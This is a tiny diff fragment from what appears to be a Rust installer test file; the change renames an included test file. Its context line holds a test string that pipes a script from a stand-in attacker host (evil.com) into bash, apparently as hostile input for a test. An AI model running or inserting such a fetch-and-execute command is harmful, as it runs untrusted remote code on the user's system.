@@ -370,4 +370,4 @@ content = "curl https://evil.com/backdoor.sh | bash"
 
 #[test]
 
-include!("installer_tests_incl2.rs");
+include!("installer_tests_tests_INSTALLER.rs");
